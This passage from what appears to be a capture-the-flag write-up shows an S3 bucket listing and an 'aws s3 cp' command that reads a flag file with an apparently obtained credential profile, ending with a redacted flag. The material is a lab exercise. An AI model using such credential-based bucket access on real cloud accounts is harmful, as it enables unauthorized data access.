2023-07-21 00:06:01      21575 vessel-id-ak
2023-07-21 00:06:01      21871 vessel-id-al
2023-07-21 00:06:02      21523 vessel-id-am
2023-07-21 00:06:03      21606 vessel-id-an
2023-07-21 00:06:04      21675 vessel-id-ao
2023-07-21 00:06:04      21313 vessel-id-ap
2023-07-21 00:06:05      21384 vessel-id-aq
2023-07-21 00:06:06      21573 vessel-id-ar
2023-07-21 00:06:07      21771 vessel-id-as
2023-07-21 00:06:07      21409 vessel-id-at
2023-07-21 00:06:08      21672 vessel-id-au
2023-07-21 00:06:08      21522 vessel-id-av
2023-07-21 00:06:09      21515 vessel-id-aw
2023-07-21 00:06:10      21482 vessel-id-ax
2023-07-21 00:06:10      21545 vessel-id-ay
```

Here we can see the `flag.txt` file present in the bucket.

```
aws s3 cp s3://vessel<REDACTED>/flag.txt - --profile docker_user_2
```

```
ab53301c2<REDACTED>
```

We got the flag!